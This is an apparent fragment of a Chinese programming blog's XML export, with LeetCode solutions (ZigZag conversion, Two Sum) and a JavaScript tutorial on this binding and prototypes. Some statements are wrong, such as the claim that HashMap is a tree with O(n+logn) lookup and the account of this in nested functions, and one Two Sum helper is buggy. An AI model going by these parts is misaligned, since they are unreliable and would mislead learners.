class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;c.length;i++)&#123;</span><br><span class="line">            index[i] = i % (<span class="number">2</span>*numRows-<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(index[i]&gt;numRows-<span class="number">1</span>)</span><br><span class="line">                index[i] = <span class="number">2</span>*numRows-<span class="number">2</span> - index[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;c.length;j++)</span><br><span class="line">            sb[index[j]].append(c[j]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;sb.length;k++)</span><br><span class="line">            sb[<span class="number">0</span>].append(sb[k]);</span><br><span class="line">        <span class="keyword">return</span> sb[<span class="number">0</span>].toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Boundary-Check"><a href="#Boundary-Check" class="headerlink" title="Boundary Check"></a>Boundary Check</h2><blockquote>
<p>嵌套指针会遇到一个异常，除零异常。那么，应该检测<code>numRows</code>值是否为<code>1</code>，如果为<code>1</code>，则应该直接返回字符串<code>s</code>。</p>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<ol>
<li>这道题直接去解，是一个好方法，但是明显是一个索引递增的循环。</li>
<li>嵌套指针的使用可以更巧妙的解决这道题目，至于巧在哪里？比直接循环好在，封装了每行的索引生成，通过列高可以计算出每个元素相应的行索引。</li>
</ol>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>嵌套指针</tag>
      </tags>
  </entry>
  <entry>
    <title>1.TwoSum</title>
    <url>/2017/01/06/1-TwoSum/</url>
    <content><![CDATA[<p>Given an array of integers, return <strong>indices</strong> of the two numbers such that they add up to a specific target.</p>
<p>You may assume that each input would have <strong><em>exactly</em></strong> one solution.</p>
<p><strong>Example:</strong></p>
<pre><code>Given nums = [2, 7, 11, 15], target = 9,

Because nums[0] + nums[1] = 2 + 7 = 9,
return [0, 1].
</code></pre><a id="more"></a>
<h1 id="爆破法："><a href="#爆破法：" class="headerlink" title="爆破法："></a>爆破法：</h1><blockquote>
<p>通过遍历两次数组，找出所有两个数的组合，将结果与target比较，返回满足要求的索引。这种方法简单易懂，但是如果寻找三个数或者以上的多位相加，他的时间复杂度是指数增长的。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Standard Brute Forced method to solve;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TwoSum</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j = i+<span class="number">1</span>;j&lt;nums.length;j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(target-nums[i] == nums[j])</span><br><span class="line">					<span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;i,j&#125;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"No Such Two Arguments"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>上面这是一种标准的暴力破解方法，简单易懂，但是如果是找三个或者4个，这种多层的嵌套不利于实际操作和理解。应该借助下面这种封装的方式来避免多层（3层以上的）嵌套。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This method is a Brute Forced method.</span></span><br><span class="line"><span class="comment"> * time completicity is O(n2);</span></span><br><span class="line"><span class="comment"> * space complicity is O(1);</span></span><br><span class="line"><span class="comment"> * beats: 25%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TwoSum</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">    	<span class="keyword">int</span> []ret = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>];</span><br><span class="line">    	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,j=i;i&lt;nums.length;i++)&#123;</span><br><span class="line">    			<span class="keyword">int</span> tmp = target-nums[i];</span><br><span class="line">    			<span class="keyword">if</span>(ret[<span class="number">1</span>]==<span class="number">0</span>)&#123;</span><br><span class="line">    				ret[<span class="number">0</span>] = i; </span><br><span class="line">					ret[<span class="number">1</span>] = <span class="keyword">this</span>.find(nums,tmp,++j);</span><br><span class="line">    			&#125;<span class="keyword">else</span></span><br><span class="line">    				<span class="keyword">break</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span>[] nums,<span class="keyword">int</span> target,<span class="keyword">int</span> lo)</span></span>&#123;</span><br><span class="line">    	<span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    	<span class="keyword">for</span>(<span class="keyword">int</span> i=lo;i&lt;nums.length;i++)&#123;</span><br><span class="line">    		<span class="keyword">if</span>(target&lt;nums[i]) <span class="keyword">continue</span>;</span><br><span class="line">    		<span class="keyword">if</span>(target == nums[i])&#123;</span><br><span class="line">    			ret = i;</span><br><span class="line">    			<span class="keyword">break</span>;</span><br><span class="line">    		&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Hash法："><a href="#Hash法：" class="headerlink" title="Hash法："></a>Hash法：</h1><blockquote>
<p>HashMap的数据结构是树，使用HashMap，它的查询时的时间复杂度是O(n+logn)。</p>
</blockquote>
<p><strong>Java实现</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/two-sum/submissions/</span></span><br><span class="line"><span class="comment"> * Beats : 45%;</span></span><br><span class="line"><span class="comment"> * Time complicity is O(n);</span></span><br><span class="line"><span class="comment"> * Space complicity is O(n);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TwoSum3</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)&#123;</span><br><span class="line">		Map&lt;Integer,Integer&gt; map = <span class="keyword">new</span> HashMap();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">			map.put(nums[i],i);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;nums.length;j++)&#123;</span><br><span class="line">			 <span class="comment">// We don't need two same elements!</span></span><br><span class="line">			<span class="keyword">if</span>(map.containsKey(target-nums[j])&amp;&amp;(map.get(target-nums[j])!=j))&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;j,map.get(target-nums[j])&#125;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"No Such Two Arguments"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/two-sum/submissions/</span></span><br><span class="line"><span class="comment"> * Beats : 95.51%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; twoSum(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">		<span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; hash;</span><br><span class="line">		<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.size(); i++)&#123;</span><br><span class="line">			<span class="keyword">int</span> numToFind = target - nums[i];</span><br><span class="line">			<span class="keyword">if</span> (hash.find(numToFind) != hash.end())&#123;</span><br><span class="line">				result.push_back(hash[numToFind]);</span><br><span class="line">				result.push_back(i);</span><br><span class="line">				<span class="keyword">return</span> result;</span><br><span class="line">			&#125;</span><br><span class="line">			hash[nums[i]] = i;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>python实现</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span><span class="params">(self, nums, target)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        hash_dict = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">            numToFind = target - nums[i]</span><br><span class="line">            <span class="keyword">if</span> numToFind <span class="keyword">in</span> hash_dict:</span><br><span class="line">                <span class="keyword">return</span> [hash_dict[numToFind], i]</span><br><span class="line">            hash_dict[nums[i]] = i;</span><br></pre></td></tr></table></figure>
<h2 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h2><blockquote>
<p>[{0,-2,0,0},0],对于这样的查询，HashMap中存放了相同的key的情况，是覆盖了前面<br>两个0的索引，所以答案是(0,3);</p>
</blockquote>
<h1 id="引申问题"><a href="#引申问题" class="headerlink" title="引申问题"></a>引申问题</h1><blockquote>
<p>如果问题换成返回数组的值，而不是元素的索引，其实还有更好的办法。</p>
</blockquote>
<h2 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h2><p>这个方法常用在有序数组。</p>
<blockquote>
<p>1.将数组排序，使用快排或者归并排序，时间复杂度为O（nlogn）。<br><br>2.使用两个索引，分别从头和尾部逼近，如果相加小于target，那么头部索引++；如果大于，则尾部索引–，直到找到。<br><br>3.时间复杂度总共为O（nlogn+n）。<br></p>
<p>缺点：只能返回元素的值，由于排序打乱了索引。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This method is found the 2 nums sum is target ,but the return isn't the index!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TwoSum4</span></span>&#123;</span><br><span class="line">	<span class="comment">//the return isn't index,it is a array of values</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)&#123;</span><br><span class="line">		Arrays.sort(nums);</span><br><span class="line">		<span class="keyword">int</span> lo = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> hi = nums.length-<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">while</span>(lo&lt;hi)&#123;</span><br><span class="line">			<span class="keyword">if</span>(nums[lo]+nums[hi]==target) <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;nums[lo],nums[hi]&#125;;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(nums[lo]+nums[hi] &gt; target) hi--;</span><br><span class="line">			<span class="keyword">else</span> lo++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"No Such Two Arguments"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>这道题有两个目的：</p>
<ol>
<li>通过找两个数的和，接下来还有找三个数的四个数的，那么多层嵌套是非常反逻辑的，会把你带到逻辑漩涡里。所以，封装成找两个数的和，三个数的等这些<code>函数</code>后，那么问题被简化了。</li>
<li>逼近法是一个很好的查找元素的思路，对于数组先排序，利用数组的有序性，通过<code>双指针+逼近法</code>。但是，缺点是排序打乱了索引，只能查找元素值。</li>
</ol>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>双指针+逼近法</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>JS的this、__proto__ 和. prototype 、constructor</title>
    <url>/2016/12/22/JS%E7%9A%84this%E3%80%81__proto__%20%E5%92%8C.%20prototype%20%E3%80%81constructor/</url>
    <content><![CDATA[<h2 id="一、this关键字"><a href="#一、this关键字" class="headerlink" title="一、this关键字"></a>一、this关键字</h2><h3 id="作为函数被调用"><a href="#作为函数被调用" class="headerlink" title="作为函数被调用"></a>作为函数被调用</h3><blockquote>
<p>函数也可以直接被调用，此时 this 绑定到全局对象。在浏览器中，window 就是该全局对象。比如下面的例子：函数被调用时，this 被绑定到全局对象，接下来执行赋值语句，相当于隐式的声明了一个全局变量，这显然不是调用者希望的。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeNoSense</span>(<span class="params">x</span>) </span>&#123; </span><br><span class="line">	<span class="keyword">this</span>.x = x; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">makeNoSense(<span class="number">5</span>); </span><br><span class="line">x;<span class="comment">// x 已经成为一个值为 5 的全局变量</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h3 id="作为对象方法调用"><a href="#作为对象方法调用" class="headerlink" title="作为对象方法调用"></a>作为对象方法调用</h3><blockquote>
<p>在 JavaScript 中，函数也是对象，因此函数可以作为一个对象的属性，此时该函数被称为该对象的方法，在使用这种调用方式时，this 被自然绑定到该对象。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> point = &#123; </span><br><span class="line">x : <span class="number">0</span>, </span><br><span class="line">y : <span class="number">0</span>, </span><br><span class="line">	moveTo : <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123; </span><br><span class="line">		<span class="keyword">this</span>.x = <span class="keyword">this</span>.x + x; </span><br><span class="line">		<span class="keyword">this</span>.y = <span class="keyword">this</span>.y + y; </span><br><span class="line">	&#125; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">point.moveTo(<span class="number">1</span>, <span class="number">1</span>)<span class="comment">//this 绑定到当前对象，即 point 对象</span></span><br></pre></td></tr></table></figure>
<p><strong>内部函数再定义内部函数</strong></p>
<p>上述的moveTo()函数已经是point的内部函数了，如果，我还想在moveTo中再加入一个函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> point = &#123; </span><br><span class="line">	x : <span class="number">0</span>, </span><br><span class="line">	y : <span class="number">0</span>, </span><br><span class="line">	moveTo : <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">//point对象</span></span><br><span class="line">		<span class="comment">// 内部函数</span></span><br><span class="line">		<span class="keyword">var</span> moveX = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">//window对象</span></span><br><span class="line">		<span class="keyword">this</span>.x = x;<span class="comment">//this 绑定到了哪里？</span></span><br><span class="line">	&#125;; </span><br><span class="line">	<span class="comment">// 内部函数</span></span><br><span class="line">	<span class="keyword">var</span> moveY = <span class="function"><span class="keyword">function</span>(<span class="params">y</span>) </span>&#123; </span><br><span class="line">		<span class="keyword">this</span>.y = y;<span class="comment">//this 绑定到了哪里？</span></span><br><span class="line">	&#125;; </span><br><span class="line"></span><br><span class="line">	moveX(x); </span><br><span class="line">	moveY(y); </span><br><span class="line">	&#125; </span><br><span class="line">&#125;; </span><br><span class="line">point.moveTo(<span class="number">1</span>, <span class="number">1</span>); </span><br><span class="line">point.x; <span class="comment">//==&gt;0</span></span><br><span class="line">point.y; <span class="comment">//==&gt;0</span></span><br><span class="line">x; <span class="comment">//==&gt;1</span></span><br><span class="line">y; <span class="comment">//==&gt;1</span></span><br></pre></td></tr></table></figure>
<p>这里出现了一个错误，第一个this显示出是point对象，但是第二个this却显示出是window对象。</p>
<blockquote>
<p>这属于 JavaScript 的设计缺陷，正确的设计方式是内部函数的 this 应该绑定到其外层函数对应的对象上，为了规避这一设计缺陷，聪明的 JavaScript 程序员想出了变量替代的方法，约定俗成，该变量一般被命名为 that。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> point = &#123; </span><br><span class="line">	x : <span class="number">0</span>, </span><br><span class="line">	y : <span class="number">0</span>, </span><br><span class="line">	moveTo : <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123; </span><br><span class="line">		<span class="keyword">var</span> that = <span class="keyword">this</span>; </span><br><span class="line">		<span class="comment">// 内部函数</span></span><br><span class="line">		<span class="keyword">var</span> moveX = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123; </span><br><span class="line">			that.x = x; </span><br><span class="line">		&#125;; </span><br><span class="line">		<span class="comment">// 内部函数</span></span><br><span class="line">		<span class="keyword">var</span> moveY = <span class="function"><span class="keyword">function</span>(<span class="params">y</span>) </span>&#123; </span><br><span class="line">			that.y = y; </span><br><span class="line">		&#125; </span><br><span class="line">		moveX(x); </span><br><span class="line">		moveY(y); </span><br><span class="line">	&#125; </span><br><span class="line">&#125;; </span><br><span class="line">point.moveTo(<span class="number">1</span>, <span class="number">1</span>); </span><br><span class="line">point.x; <span class="comment">//==&gt;1 </span></span><br><span class="line">point.y; <span class="comment">//==&gt;1</span></span><br></pre></td></tr></table></figure>
<p>当内部函数嵌套只有一层，那么还是符合<code>内部函数this绑定在外层函数对应的对象上</code>，但是，如果超过了1层嵌套，那么在高于1层的内部函数中，this对象如果不借助that，那么this将会指向window对象。</p>
<h3 id="apply或call调用"><a href="#apply或call调用" class="headerlink" title="apply或call调用"></a>apply或call调用</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x, y</span>)</span>&#123; </span><br><span class="line">	<span class="keyword">this</span>.x = x; </span><br><span class="line">	<span class="keyword">this</span>.y = y; </span><br><span class="line">	<span class="keyword">this</span>.moveTo = <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>)</span>&#123; </span><br><span class="line">	    <span class="keyword">this</span>.x = x; </span><br><span class="line">	    <span class="keyword">this</span>.y = y; </span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Point(<span class="number">0</span>, <span class="number">0</span>); </span><br><span class="line"><span class="keyword">var</span> p2 = &#123;<span class="attr">x</span>: <span class="number">0</span>, <span class="attr">y</span>: <span class="number">0</span>&#125;; </span><br><span class="line">p1.moveTo(<span class="number">1</span>, <span class="number">1</span>); </span><br><span class="line">p1.moveTo.apply(p2, [<span class="number">10</span>, <span class="number">10</span>]);</span><br></pre></td></tr></table></figure>
<p>这里p1是一个<code>Point {x: 1, y: 1}</code>对象，而p2则是一个<code>Object {x: 10, y: 10}</code>对象。</p>
<h3 id="eval调用"><a href="#eval调用" class="headerlink" title="eval调用"></a>eval调用</h3><blockquote>
<p>JavaScript 中的 eval 方法可以将字符串转换为 JavaScript 代码，使用 eval 方法时，this 指向哪里呢？答案很简单，看谁在调用 eval 方法，调用者的执行环境（ExecutionContext）中的 this 就被 eval 方法继承下来了。</p>
</blockquote>
<h2 id="二、proto-和-prototype"><a href="#二、proto-和-prototype" class="headerlink" title="二、proto 和. prototype"></a>二、<strong>proto</strong> 和. prototype</h2><blockquote>
<p>p.<strong>proto</strong> === p.constructor.prototype === Person.prototype;</p>
</blockquote>
<p><strong>一、 所有构造器/函数的<strong>proto</strong>都指向Function.prototype，它是一个空函数（Empty function）</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">A.__proto__ === <span class="built_in">Function</span>.prototype; <span class="comment">//true</span></span><br><span class="line"><span class="comment">//内置对象</span></span><br><span class="line"><span class="built_in">Number</span>.__proto__ === <span class="built_in">Function</span>.prototype  <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>特殊的，如Math对象的<em>proto</em>是Object.prototype</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.__proto__ === <span class="built_in">Object</span>.prototype  <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>知道了所有构造器（含内置及自定义）的<strong>proto</strong>都是Function.prototype，那Function.prototype的<strong>proto</strong>是谁呢？<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.__proto__ === <span class="built_in">Object</span>.prototype;<span class="comment">//true</span></span><br></pre></td></tr></table></figure></p>
<p>这说明所有的构造器也都是一个普通JS对象，可以给构造器添加/删除属性等。同时它也继承了Object.prototype上的所有方法：toString、valueOf、hasOwnProperty等。</p>
</blockquote>
<p>最后Object.prototype的<strong>proto</strong>是谁？</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.__proto__ === <span class="literal">null</span>  <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p><strong>二、所有对象的<strong>proto</strong>都指向其构造器的prototype</strong></p>
<p><code>__proto__</code>指向了，我不知道怎么说，用java的话来说就是class类。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">name</span>: <span class="string">'jack'</span>&#125;</span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/hello/g</span></span><br><span class="line"><span class="keyword">var</span> date = <span class="keyword">new</span> <span class="built_in">Date</span></span><br><span class="line"><span class="keyword">var</span> err = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'exception'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">console</span>.log(obj.__proto__ === <span class="built_in">Object</span>.prototype) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(arr.__proto__ === <span class="built_in">Array</span>.prototype)  <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(reg.__proto__ === <span class="built_in">RegExp</span>.prototype) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(date.__proto__ === <span class="built_in">Date</span>.prototype)  <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(err.__proto__ === <span class="built_in">Error</span>.prototype)  <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>再看看自定义的构造器，这里定义了一个Person</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> Person(<span class="string">'jack'</span>)</span><br><span class="line"><span class="built_in">console</span>.log(p.__proto__ === Person.prototype) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>p是Person的实例对象，p的内部原型总是指向其构造器Person的prototype。</p>
</blockquote>
<p>每个对象都有一个constructor属性，可以获取它的构造器，因此以下打印结果也是恒等的</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> Person(<span class="string">'jack'</span>)</span><br><span class="line">p.__proto__ === p.constructor.prototype</span><br></pre></td></tr></table></figure>
<h3 id="修改原型"><a href="#修改原型" class="headerlink" title="修改原型"></a>修改原型</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> Person(<span class="string">'jack'</span>)</span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">	getName: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>又由于</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">p.__proto__ === p.constructor.prototype === Person.prototype;</span><br></pre></td></tr></table></figure>
<p>所以，我觉得有三种写法。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Person.prototype.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> per = <span class="keyword">new</span> Person(<span class="string">'jack'</span>);</span><br><span class="line">per.__proto__.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">per.constructor.prototype.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="三、constructor属性"><a href="#三、constructor属性" class="headerlink" title="三、constructor属性"></a>三、constructor属性</h2><blockquote>
<p>返回一个指向创建了该对象原型的函数引用。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a,b;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">A</span> (<span class="params">arg1,arg2</span>) </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.a = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">this</span>.b=<span class="number">2</span>; </span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	A.prototype.log = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="keyword">this</span>.a);</span><br><span class="line">	&#125;</span><br><span class="line">	a = <span class="keyword">new</span> A();</span><br><span class="line">	b = <span class="keyword">new</span> A();</span><br><span class="line">&#125;)()</span><br><span class="line">a.log();</span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line">b.log();</span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>通过以上代码我们可以得到两个对象，a,b，他们同为类A的实例。因为A在闭包里，所以现在我们是不能直接访问A的，那如果我想给类A增加新方法怎么办？</p>
</blockquote>
